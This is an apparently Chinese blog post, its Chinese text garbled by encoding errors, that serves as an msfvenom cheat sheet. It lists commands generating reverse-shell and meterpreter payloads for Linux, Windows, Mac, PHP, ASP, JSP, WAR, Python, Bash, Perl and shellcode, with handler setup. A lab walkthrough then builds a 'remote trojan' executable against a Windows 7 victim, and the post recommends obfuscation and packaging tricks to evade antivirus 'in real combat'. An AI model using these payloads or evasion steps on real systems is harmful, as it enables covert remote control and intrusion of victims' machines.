<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>msfvenomç”Ÿæˆå„ç±»Payloadå‘½ä»¤ï¼Œè¿œç¨‹æœ¨é©¬æ”»å‡» | Directoree</title><meta name="keywords" content="msfvenom,è¿œç¨‹æœ¨é©¬æ”»å‡»"><meta name="author" content="Directoree"><meta name="copyright" content="Directoree"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="msfvenomç”Ÿæˆå„ç±»Payloadå‘½ä»¤ Often one of the most useful(and to the beginner underrated) abilities of Metasploit is the  msfpayload module. Multiple payloads can be created with this module and it helps">
<meta property="og:type" content="article">
<meta property="og:title" content="msfvenomç”Ÿæˆå„ç±»Payloadå‘½ä»¤ï¼Œè¿œç¨‹æœ¨é©¬æ”»å‡»">
<meta property="og:url" content="https://directoree.github.io/post/Metasploit1/index.html">
<meta property="og:site_name" content="Directoree">
<meta property="og:description" content="msfvenomç”Ÿæˆå„ç±»Payloadå‘½ä»¤ Often one of the most useful(and to the beginner underrated) abilities of Metasploit is the  msfpayload module. Multiple payloads can be created with this module and it helps">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/top_img/archive.jpg">
<meta property="article:published_time" content="2018-11-14T14:09:28.000Z">
<meta property="article:modified_time" content="2018-12-24T12:29:12.000Z">
<meta property="article:author" content="Directoree">
<meta property="article:tag" content="msfvenom">
<meta property="article:tag" content="è¿œç¨‹æœ¨é©¬æ”»å‡»">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/top_img/archive.jpg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://directoree.github.io/post/Metasploit1/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
  root: '/',
  hexoversion: '5.1.1',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"æ‰¾ä¸åˆ°æ‚¨æŸ¥è¯¢çš„å†…å®¹ï¼š${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: undefined,
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶é”™è¯¯',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'å¤©',
  date_suffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: {"limitCount":50,"languages":{"author":"ä½œè€…: Directoree","link":"é“¾æ¥: ","source":"æ¥æº: Directoree","info":"è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚"}},
  ClickShowText: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  baiduPush: false,
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
};

var saveToLocal = {
  set: function setWithExpiry(key, value, ttl) {
    const now = new Date()
    const expiryDay = ttl * 86400000
    const item = {
      value: value,
      expiry: now.getTime() + expiryDay,
    }
    localStorage.setItem(key, JSON.stringify(item))
  },

  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isSidebar: true,
  postUpdate: '2018-12-24 20:29:12'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>var activateDarkMode = function () {
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
  }
}
var activateLightMode = function () {
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
  }
}

var autoChangeMode = 'true'
var t = saveToLocal.get('theme')
if (autoChangeMode === '1') {
  var isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
  var isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
  var isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

  if (t === undefined) {
    if (isLightMode) activateLightMode()
    else if (isDarkMode) activateDarkMode()
    else if (isNotSpecified || hasNoSupport) {
      var now = new Date()
      var hour = now.getHours()
      var isNight = hour <= 6 || hour >= 18
      isNight ? activateDarkMode() : activateLightMode()
    }
    window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
      if (saveToLocal.get('theme') === undefined) {
        e.matches ? activateDarkMode() : activateLightMode()
      }
    })
  } else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else if (autoChangeMode === '2') {
  now = new Date()
  hour = now.getHours()
  isNight = hour <= 6 || hour >= 18
  if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else {
  if (t === 'dark') activateDarkMode()
  else if (t === 'light') activateLightMode()
}</script><meta name="generator" content="Hexo 5.1.1"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length_num">81</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length_num">45</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length_num">27</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> ä¸»é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> å½’æ¡£</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> å‹é“¾</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> å…³äº</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> æ¸…å•</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> Movie</span></a></li></ul></div></div></div></div><div id="body-wrap"><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">ç›®å½•</div><div class="sidebar-toc__progress"><span class="progress-notice">ä½ å·²ç»è¯»äº†</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#msfvenom%E7%94%9F%E6%88%90%E5%90%84%E7%B1%BBPayload%E5%91%BD%E4%BB%A4"><span class="toc-text">   msfvenomç”Ÿæˆå„ç±»Payloadå‘½ä»¤</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Linux"><span class="toc-text">Linux</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Windows"><span class="toc-text">Windows</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Mac"><span class="toc-text">Mac</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PHP"><span class="toc-text">PHP</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ASP"><span class="toc-text">ASP</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#JSP"><span class="toc-text">JSP</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#WAR"><span class="toc-text">WAR</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Python"><span class="toc-text">Python</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Bash"><span class="toc-text">Bash</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Perl"><span class="toc-text">Perl</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Shellcode"><span class="toc-text">Shellcode</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Linux-Based-Shellcode"><span class="toc-text">Linux Based Shellcode</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Windows-Based-Shellcode"><span class="toc-text">Windows Based Shellcode</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Mac-Based-Shellcode"><span class="toc-text">Mac Based Shellcode</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Handlers%E6%A8%A1%E5%9D%97"><span class="toc-text">Handlersæ¨¡å—</span></a></li></ol></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/top_img/archive.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Directoree</a></span><span id="menus"><div id="search_button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> æœç´¢</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> ä¸»é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> å½’æ¡£</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> å‹é“¾</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> å…³äº</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> æ¸…å•</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> Movie</span></a></li></ul></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">msfvenomç”Ÿæˆå„ç±»Payloadå‘½ä»¤ï¼Œè¿œç¨‹æœ¨é©¬æ”»å‡»</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2018-11-14T14:09:28.000Z" title="å‘è¡¨äº 2018-11-14 22:09:28">2018-11-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2018-12-24T12:29:12.000Z" title="æ›´æ–°äº 2018-12-24 20:29:12">2018-12-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Metasploit/">Metasploit</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»é‡:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h4 id="msfvenomç”Ÿæˆå„ç±»Payloadå‘½ä»¤"><a href="#msfvenomç”Ÿæˆå„ç±»Payloadå‘½ä»¤" class="headerlink" title="   msfvenomç”Ÿæˆå„ç±»Payloadå‘½ä»¤"></a><font face="Arial">   msfvenomç”Ÿæˆå„ç±»Payloadå‘½ä»¤</font></h4><blockquote>
<p><font face="Arial">Often one of the most useful(and to the beginner underrated) abilities of Metasploit is the  msfpayload module. Multiple payloads can be created with this module and it helps something that can give you a shell in almost any situation. For each of these payloads you can go into msfconsole and select exploit/multi/handler. Run â€˜set payloadâ€™ for the relevant payload used and configure all necessary options (LHOST, LPORT, etc). Execute and wait for the payload to be run. For the examples below itâ€™s pretty self explanatory but LHOST should be filled in with your IP address(LAN IP if  attacking within the network, WAN IP if attacking across the internet), and LPORT should be the port you wish to be connected back on.</font></p>
</blockquote>
<h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h5><p><font face="Arial">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf &gt; shell.elf</font></p>
<h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h5><p><font face="Arial">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe &gt; shell.exe</font></p>
<h5 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h5><p><font face="Arial">msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho &gt; shell.macho</font></p>
<h5 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h5><p><font face="Arial">msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw &gt; shell.php</font></p>
<p><font face="Arial">cat shell.php | pbcopy &amp;&amp; echo â€˜&lt;?php â€˜ | tr -d â€˜\nâ€™ &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</font></p>
<h5 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h5><p><font face="Arial">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp &gt; shell.asp</font></p>
<h5 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h5><p><font face="Arial">msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw &gt; shell.jsp</font></p>
<h5 id="WAR"><a href="#WAR" class="headerlink" title="WAR"></a>WAR</h5><p><font face="Arial">msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war &gt; shell.war                    Scripting Payloads</font></p>
<h5 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h5><p><font face="Arial">msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw &gt; shell.py</font></p>
<h5 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h5><p><font face="Arial">msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw &gt; shell.sh</font></p>
<h5 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h5><p><font face="Arial">msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw &gt; shell.pl</font></p>
<h5 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h5><p><font face="Arial">For all shellcode see â€˜msfvenom â€“help-formatsâ€™ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.</font></p>
<h5 id="Linux-Based-Shellcode"><a href="#Linux-Based-Shellcode" class="headerlink" title="Linux Based Shellcode"></a>Linux Based Shellcode</h5><p><font face="Arial">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language></font></p>
<h5 id="Windows-Based-Shellcode"><a href="#Windows-Based-Shellcode" class="headerlink" title="Windows Based Shellcode"></a>Windows Based Shellcode</h5><p>Your IP Address&gt; LPORT=<Your Port to Connect On> -f  language    â€œlanguageæ”¾åœ¨&lt;&gt;é‡Œâ€<br></font></p>
<h5 id="Mac-Based-Shellcode"><a href="#Mac-Based-Shellcode" class="headerlink" title="Mac Based Shellcode"></a>Mac Based Shellcode</h5><p><font face="Arial">msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language></font></p>
<h5 id="Handlersæ¨¡å—"><a href="#Handlersæ¨¡å—" class="headerlink" title="Handlersæ¨¡å—"></a><font face="Arial">Handlersæ¨¡å—</h5><p>Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.</font></p>
<blockquote>
<p><font face="Arial">use exploit/multi/handler</font><br> <font face="Arial">set LHOST <LHOST value></font><br> <font face="Arial">set LPORT <LPORT value></font><br> <font face="Arial">exploit -j -z</font><br> <font face="Arial">Once the required values are completed the following command will </font>execute your handler â€“ â€˜msfconsole -L -r â€˜</font></p>
</blockquote>
<hr>
<p>&nbsp;<br>&nbsp;<br><strong>ä¸‹é¢ä»¥ä¸€ä¸ªå®ä¾‹è¯´æ˜ä½¿ç”¨æ–¹æ³•</strong></p>
<p>Metasploitä¹‹æˆ‘çš„è¿œç¨‹æ§åˆ¶è½¯ä»¶<br>å‚è€ƒæ–‡çŒ®ï¼š<a target="_blank" rel="noopener" href="http://www.evil0x.com/posts/838.html">Metasploitæ¸—é€æµ‹è¯•ç¬”è®°(Meterpreterç¯‡</a></p>
<p>è¿œç¨‹æ§åˆ¶è½¯ä»¶â€“&gt;è¿œæ§åé—¨æœ¨é©¬ç¨‹åº</p>
<p>æœ¨é©¬ç¨‹åºâ€“&gt;æ§åˆ¶ç«¯ï¼ˆæ”»å‡»è€…ï¼‰â€“&gt;æœåŠ¡ç«¯ï¼ˆæ”»å‡»ç›®æ ‡ï¼‰</p>
<p>æµ‹è¯•ç¯å¢ƒï¼š<br>æ”»å‡»è€…ï¼škali-linux    â€“&gt;192.168.2.146<br>å—å®³è€…ï¼šWindows07     â€“&gt;192.168.2.107</p>
<p>ä»¥ä¸‹ä¸ºkali-linux-2.0ç³»ç»Ÿä¸‹çš„ç”Ÿæˆä¸è¿æ¥æ–¹å¼ï¼ˆä½¿ç”¨msfvenomå‘½ä»¤çš„ï¼‰<br><a target="_blank" rel="noopener" href="http://www.77169.com/hack/201602/224112.shtm">å‚è€ƒæ–‡çŒ®ä¸€</a><br><a target="_blank" rel="noopener" href="http://www.i0day.com/1173.html">ç±»ä¼¼æ–‡çŒ®äºŒ</a></p>
<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=ä½ çš„ip LPORT=ä½ çš„ç«¯å£ -f exe -o payload.exe</p>
<p>ä»¥ä¸Šå°±æ˜¯åŸºæœ¬å‘½ä»¤ï¼Œè§£é‡Šä¸€ä¸‹ï¼Œ-påé¢æ˜¯payloadåç§°ï¼Œç„¶åæ˜¯ä½ çš„ipå’Œç«¯å£(payloadå‚æ•°)ï¼Œç„¶åæ˜¯-f æ ¼å¼ï¼Œç”±äºæ˜¯å®éªŒå°±å…ˆè®¾ç½®exeï¼Œç„¶å-o payload.exeæŒ‡ä¿å­˜ä¸ºpayload.exeã€‚å½“ç„¶ï¼Œå®éªŒçš„æ—¶å€™å¯ä»¥æŠŠæ ¼å¼è®¾ç½®æˆexeï¼Œä½†æ˜¯å®æˆ˜çš„æ—¶å€™æ¯•ç«Ÿæœ‰æ€æ¯’è½¯ä»¶ï¼Œæ‰€ä»¥æ ¼å¼æœ€å¥½æ˜¯jarï¼Œjarå°±è¦æ±‚å¯¹æ–¹æœ‰javaç¯å¢ƒï¼Œå¯ä»¥ç”¨æ¥æ‹¿java webç½‘ç«™çš„æ—¶å€™ä½¿ç”¨ï¼Œæˆ–è€…è®¾ç½®æˆpythonç„¶åè‡ªè¡Œshellcodeå…æ€ï¼Œå³ç”¨Pythonå®¹å™¨ï¼Œç„¶åç”¨AESæ··æ·†Pythonä»£ç ï¼Œå†ç”¨pyinstallerç¼–è¯‘exeï¼Œè¿™æ˜¯ç›®å‰æœ€å®Œç¾çš„è¿‡æ€æ¯’è½¯ä»¶æ–¹æ¡ˆï¼Œå°±è¿å‹’ç´¢è½¯ä»¶éƒ½ä¸ä¼šè¢«æ€æ¯’è½¯ä»¶å¹²æ‰ï¼Œé™¤éæœ‰ç‰¹æ®ŠåŠ¨ä½œï¼Œæ¯”å¦‚ä¿®æ”¹æ³¨å†Œè¡¨ã€‚å½“ç„¶ï¼Œæ¥¼ä¸»è¿˜æœ‰å¾ˆå¤šè¦å­¦ä¹ ã€‚</p>
<p>å…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-bash"><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>192.168.2.146 LPORT<span class="token operator">=</span>44444 -f exe -o test.exe            <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>â€“&gt;åœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆæœ¨é©¬ç¨‹åºtest.exeï¼ŒPSï¼šç”Ÿæˆpayload.exeä¸ä¼šè¢«æ€ï¼Œtest.exeè¢«ç§’æ€</p>
<p>PS:ä¹‹åçš„æ“ä½œæ­¥éª¤æ˜¯å’Œä¸Šé¢çš„ä¸€æ ·çš„â†“</p>
<p>ä¹‹ååœ¨metasploitä¸‹è¿æ¥åé—¨ç¨‹åºï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-bash"><code class="language-bash">msfconsole                  --<span class="token operator">></span>å¼€å¯metasploit
use exploit/multi/handler       --<span class="token operator">></span>ä½¿ç”¨â€œexploit/multi/handlerâ€è¿™ä¸ªæ¨¡å—è¿æ¥åé—¨ç¨‹åº
show options   --<span class="token operator">></span>æŸ¥çœ‹éœ€è¦è®¾ç½®çš„é…ç½®ä¿¡æ¯//è¿™é‡Œå…¶å®ä¸éœ€è¦é…ç½®ä»»ä½•ä¿¡æ¯çš„
<span class="token keyword">set</span> PAYLOAD windows/meterpreter/reverse_tcp    --<span class="token operator">></span>ä½¿ç”¨tcpåå‘è¿æ¥
show options               --<span class="token operator">></span>æŸ¥çœ‹éœ€è¦è®¾ç½®çš„é…ç½®ä¿¡æ¯
<span class="token keyword">set</span> LHOST<span class="token operator">=</span>192.168.2.146    --<span class="token operator">></span>è®¾ç½®æˆ‘ä»¬æ”»å‡»è€…è‡ªå·±çš„è¿æ¥IP
<span class="token keyword">set</span> LPORT<span class="token operator">=</span>44444            --<span class="token operator">></span>è®¾ç½®æˆ‘ä»¬æ”»å‡»æµ™è‡ªå·±çš„è¿æ¥ç«¯å£
exploit                    --<span class="token operator">></span>æ‰§è¡Œè¿æ¥ï¼Œç­‰å¾…æœ¨é©¬æ‰§è¡Œåè¿æ¥<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>PSï¼šè¿œç¨‹æœ¨é©¬è¢«æ‰§è¡Œåæ¥ç€å¯ä»¥ç›´æ¥â€œshellâ€å‘½ä»¤æ‹¿ä¸‹shell</p>
<p>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>OKï¼Œå®Œæˆäº†ï¼<br>&nbsp;<br>&nbsp;</p>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="mailto:undefined">Directoree</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="https://directoree.github.io/post/Metasploit1/">https://directoree.github.io/post/Metasploit1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥è‡ª <a href="https://Directoree.github.io" target="_blank">Directoree</a>ï¼</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/msfvenom/">msfvenom</a><a class="post-meta__tags" href="/tags/%E8%BF%9C%E7%A8%8B%E6%9C%A8%E9%A9%AC%E6%94%BB%E5%87%BB/">è¿œç¨‹æœ¨é©¬æ”»å‡»</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/top_img/archive.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> æ‰“èµ<div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="å¾®ä¿¡"/></a><div class="post-qr-code-desc">å¾®ä¿¡</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="æ”¯ä»˜å®"/></a><div class="post-qr-code-desc">æ”¯ä»˜å®</div></li></ul></div></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/createGithubblog/"><img class="prev-cover" src="https://i.loli.net/2018/12/24/5c20d00794e53.jpg" onerror="onerror=null;src='/img/comment_bg.png'"><div class="pagination-info"><div class="label">ä¸Šä¸€ç¯‡</div><div class="prev_info">Hexo+Githubåšå®¢æ­å»ºç»ˆæå¤§æ³•</div></div></a></div><div class="next-post pull-right"><a href="/post/hello-world/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/top_img/archive.jpg" onerror="onerror=null;src='/img/comment_bg.png'"><div class="pagination-info"><div class="label">ä¸‹ä¸€ç¯‡</div><div class="next_info">Hello World</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> ç›¸å…³æ¨è</span></div><div class="relatedPosts-list"><div><a href="/post/Metasploit2/" title="Metasploitå·¥å…·Meterpreterçš„å‘½ä»¤é€ŸæŸ¥è¡¨"><img class="cover" src="https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/top_img/archive.jpg"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2018-11-17</div><div class="title">Metasploitå·¥å…·Meterpreterçš„å‘½ä»¤é€ŸæŸ¥è¡¨</div></div></a></div><div><a href="/post/Metasploit3/" title="Metasploitä¹‹æ¸—é€å®‰å“å®æˆ˜"><img class="cover" src="https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/top_img/archive.jpg"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2018-11-17</div><div class="title">Metasploitä¹‹æ¸—é€å®‰å“å®æˆ˜</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> è¯„è®º</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></article></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2018 - 2020 By Directoree</div><div class="framework-info"><span>æ¡†æ¶ </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>ä¸»é¢˜ </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fas fa-book-open"></i></button><button 